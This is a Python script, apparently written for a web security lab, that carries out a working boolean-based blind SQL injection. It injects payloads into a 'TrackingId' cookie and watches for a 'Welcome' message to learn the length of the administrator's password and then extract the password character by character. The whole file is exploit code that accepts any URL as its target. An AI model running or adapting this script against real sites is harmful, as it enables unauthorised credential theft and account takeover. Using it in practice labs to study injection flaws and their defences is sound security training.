import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_req(url,cookie):
    req = requests.get(url,cookies=cookie,verify=False,proxies=proxies)
    return req.text


def sqli_lenght_of_password(url):
    for i in range(50):
        sql_payload = (
            "' and {} < (SELECT LENGTH(password) from users where username = 'administrator') -- "
            .format(i+1))
        cookies = {'TrackingId': '5ecun0eWwtnl3NxQ' + sql_payload, 'session': '2FUEXuguYfkXg0JbGEP3RD5CcGxLuXQq'}
        res = perform_req(url,cookies)
        if("Welcome" in res):
            sys.stdout.write('\radmin password length is: {}'.format(i + 1))
            sys.stdout.flush()
        else:
           return i+1
    return False


def sqli_password(url,admin_password_lenght):
    password_extracted = ""
    for i in range(1,admin_password_lenght+1):
        for z in range(32, 127):
            sql_payload = "' and (SELECT SUBSTRING(password,{},1) FROM USERS WHERE username  = 'administrator') = '{}'--".format(
                i, chr(z))
            cookies = {'TrackingId': '5ecun0eWwtnl3NxQ' + sql_payload, 'session': '2FUEXuguYfkXg0JbGEP3RD5CcGxLuXQq'}
            res = perform_req(url,cookies)
            if "Welcome" in res:
                password_extracted += chr(z)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r{}'.format(password_extracted) + chr(z))
                sys.stdout.flush()
    return password_extracted








if __name__ == "__main__":
    url = input("Enter the url: ")
    result = sqli_lenght_of_password(url)
    if(result):
        sys.stdout.write('\radmin password length is: {}'.format(result))
        password = sqli_password(url,result)
        if password:
            print(password)
        else:
            print("Error cant find pass")
    else:
        print("Error Cant Find the Lenght of admin password")
